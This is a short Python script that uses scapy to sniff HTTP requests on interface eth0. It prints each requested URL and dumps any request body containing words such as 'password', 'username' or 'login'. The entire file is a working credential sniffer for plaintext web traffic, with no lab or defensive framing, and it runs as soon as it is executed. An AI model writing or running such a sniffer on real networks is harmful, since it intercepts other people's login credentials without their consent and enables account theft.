import scapy.all as s
from scapy_http import http

words = ["password", 'user', "username", "login", "pass", "User", "Username", "Password"]

def sniffer(inter):
    s.sniff(iface=inter, store=False, prn=proc_pack)

def proc_pack(pack):
    if pack.haslayer(http.HTTPRequest):
        url = pack[http.HTTPRequest].Host + pack[http.HTTPRequest].Path
        print(url)
        if pack.haslayer(s.Raw):
            load = pack[s.Raw].load
            for i in words:
                if i in str(load):
                    print(load)
                    break

sniffer("eth0")
